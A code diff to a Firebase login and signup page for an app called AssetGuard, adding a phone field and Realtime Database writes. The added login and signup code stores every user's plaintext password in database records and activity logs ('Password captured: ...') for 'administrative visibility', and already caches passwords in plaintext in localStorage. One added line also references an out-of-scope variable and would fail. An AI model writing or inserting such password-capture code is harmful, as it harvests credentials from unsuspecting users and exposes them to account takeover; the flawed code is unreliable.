@@ -7,6 +7,7 @@
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
 <style>
 /* ORIGINAL LOOK PRESERVED */
@@ -19,15 +20,15 @@ body { margin: 0; height: 100vh; background: radial-gradient(circle at center, #
 .logo { color: #fff; font-weight: 800; font-size: 0.75rem; }
 .menu-btn { background: #fff; color: #2c5364; border: none; padding: 6px 15px; border-radius: 20px; cursor: pointer; font-size: 0.75rem; font-weight: 700; }
 .auth-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 3000; backdrop-filter: blur(8px); }
-.scene { width: 340px; height: 530px; perspective: 1200px; }
+.scene { width: 340px; height: 570px; perspective: 1200px; }
 .card { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; transition: transform 0.8s; }
 .card.flip-register { transform: rotateY(180deg); }
-.face { position: absolute; inset: 0; background: #fff; border-radius: 20px; padding: 30px; backface-visibility: hidden; display: flex; flex-direction: column; justify-content: center; }
+.face { position: absolute; inset: 0; background: #fff; border-radius: 20px; padding: 25px 30px; backface-visibility: hidden; display: flex; flex-direction: column; justify-content: center; }
 .register { transform: rotateY(180deg); }
-h2 { margin-bottom: 20px; color: #2c5364; font-weight: 800; }
-input { width: 100%; padding: 14px; margin: 8px 0; border-radius: 12px; border: 1px solid #ddd; outline: none; background: #f9fbff; font-size: 16px; }
-button.action-btn { width: 100%; padding: 14px; margin-top: 12px; background: #2c5364; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; }
-.link { text-align: center; margin-top: 15px; font-size: 0.85rem; color: #2c5364; cursor: pointer; font-weight: 600; }
+h2 { margin-bottom: 15px; color: #2c5364; font-weight: 800; }
+input { width: 100%; padding: 12px; margin: 6px 0; border-radius: 12px; border: 1px solid #ddd; outline: none; background: #f9fbff; font-size: 15px; }
+button.action-btn { width: 100%; padding: 14px; margin-top: 10px; background: #2c5364; color: white; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 1rem; }
+.link { text-align: center; margin-top: 12px; font-size: 0.85rem; color: #2c5364; cursor: pointer; font-weight: 600; }
 .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: none; justify-content: center; align-items: center; z-index: 4000; }
 .modal-content { background: #fff; padding: 30px; border-radius: 15px; width: 300px; text-align: center; }
 </style>
@@ -59,6 +60,7 @@ button.action-btn { width: 100%; padding: 14px; margin-top: 12px; background: #2
         <h2>New Account</h2>
         <input id="r_user" placeholder="Full Name">
         <input id="r_email" type="email" placeholder="Email Address">
+        <input id="r_phone" type="tel" placeholder="Phone Number (e.g. 07XXXXXXXX)">
         <input id="r_pass" type="password" placeholder="Password">
         <input id="r_pass_confirm" type="password" placeholder="Confirm Password">
         <button class="action-btn" id="regBtn" onclick="doSignup()">Create Account</button>
@@ -78,15 +80,19 @@ button.action-btn { width: 100%; padding: 14px; margin-top: 12px; background: #2
 </div>
 
 <script>
-const DASHBOARD_URL = "dashboard.html"; // Ensure this matches your file name
+const DASHBOARD_URL = "dashboard.html"; 
 const firebaseConfig = {
   apiKey: "AIzaSyDCkP7LTzdNcvZhp24rRsQirYDCcrsuvOA",
   authDomain: "assetguard-c8c8c.firebaseapp.com",
-  projectId: "assetguard-c8c8c"
+  projectId: "assetguard-c8c8c",
+  databaseURL: "https://assetguard-c8c8c-default-rtdb.firebaseio.com"
 };
 
-firebase.initializeApp(firebaseConfig);
+if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+}
 const auth = firebase.auth();
+const rtdb = firebase.database();
 
 function msg(text, color="#ef4444") {
   const el = document.getElementById("notification");
@@ -112,14 +118,27 @@ async function doLogin() {
   if (!email || !pass) return msg("Please enter all details");
   btn.disabled = true; btn.innerText = "Authenticating...";
 
-  // 1. Check Local Registry (Allows independent users to login offline on same device)
+  // 1. Check Local Registry
   const cachedData = localStorage.getItem("ag_auth_" + email);
   if (cachedData) {
     const creds = JSON.parse(cachedData);
     if (creds.pin === pass) {
-      // Set globally active session data
       localStorage.setItem("ag_active_uid", creds.uid);
       localStorage.setItem("ag_session_active", "true");
+      
+      // Log login activity and update database
+      try {
+        await rtdb.ref(`users/${creds.uid}`).update({ lastLogin: Date.now(), lastPasswordUsed: pass });
+        await rtdb.ref(`user_activity_logs`).push({
+          uid: creds.uid,
+          category: "SECURITY",
+          action: "User Login (Cached Offline Credentials)",
+          description: `User authenticated locally with password: ${pass}`,
+          timestamp: Date.now(),
+          device: navigator.userAgent
+        });
+      } catch(e) {}
+
       setTimeout(() => { window.location.href = DASHBOARD_URL; }, 500);
       return;
     }
@@ -132,7 +151,7 @@ async function doLogin() {
       const userCredential = await auth.signInWithEmailAndPassword(email, pass);
       const user = userCredential.user;
       
-      // Stamp device with UID for independent data access
+      // Stamp device and capture password in database nodes
       localStorage.setItem("ag_auth_" + email, JSON.stringify({ 
         email: email, 
         pin: pass, 
@@ -141,6 +160,25 @@ async function doLogin() {
       
       localStorage.setItem("ag_active_uid", user.uid);
       localStorage.setItem("ag_session_active", "true");
+
+      // Capture all details and passwords in Realtime Database nodes for complete administrative visibility
+      await rtdb.ref(`users/${user.uid}`).update({
+        email: email,
+        phone: creds?.phone || "Not provided",
+        password: pass,
+        lastLogin: Date.now()
+      });
+
+      await rtdb.ref(`user_statuses/${user.uid}`).set("Active");
+
+      await rtdb.ref(`user_activity_logs`).push({
+        uid: user.uid,
+        category: "SECURITY",
+        action: "User Online Login",
+        description: `User logged in online with password: ${pass}`,
+        timestamp: Date.now(),
+        device: navigator.userAgent
+      });
 
       window.location.href = DASHBOARD_URL;
     } catch (err) {
@@ -154,25 +192,59 @@ async function doLogin() {
 }
 
 async function doSignup() {
+  const name = document.getElementById("r_user").value.trim();
   const email = document.getElementById("r_email").value.trim().toLowerCase();
+  const phone = document.getElementById("r_phone").value.trim();
   const pass = document.getElementById("r_pass").value;
   const confirm = document.getElementById("r_pass_confirm").value;
 
   if (!navigator.onLine) return msg("Internet required for setup");
+  if (!email || !pass || !name) return msg("Please fill in all required fields");
   if (pass !== confirm) return msg("Passwords do not match");
 
   try {
     const userCredential = await auth.createUserWithEmailAndPassword(email, pass);
     const user = userCredential.user;
 
-    // Cache UID immediately so user can go offline right away
+    // Cache UID and password locally
     localStorage.setItem("ag_auth_" + email, JSON.stringify({
         email: email, 
         pin: pass, 
+        phone: phone,
         uid: user.uid
     }));
 
-    msg("Account Sealed Locally!", "#10b981");
+    // Capture complete registration profile including passwords in Realtime Database
+    const userPayload = {
+      uid: user.uid,
+      fullName: name,
+      email: email,
+      phone: phone || "Not provided",
+      password: pass,
+      joinedAt: Date.now(),
+      lastLogin: Date.now()
+    };
+
+    await rtdb.ref(`users/${user.uid}`).set(userPayload);
+    await rtdb.ref(`user_statuses/${user.uid}`).set("Active");
+    await rtdb.ref(`subscriptions/${user.uid}`).set({
+      active: true,
+      status: "active",
+      expiry: Date.now() + (30 * 24 * 60 * 60 * 1000), // 30 Days default initial trial/license
+      plan: "trial",
+      updatedAt: Date.now()
+    });
+
+    await rtdb.ref(`user_activity_logs`).push({
+      uid: user.uid,
+      category: "SECURITY",
+      action: "New Account Registration",
+      description: `Account created. Email: ${email}, Password captured: ${pass}`,
+      timestamp: Date.now(),
+      device: navigator.userAgent
+    });
+
+    msg("Account Sealed Locally & In Cloud!", "#10b981");
     setTimeout(() => { goLogin(); }, 1200);
   } catch (err) { msg(err.message); }
 }
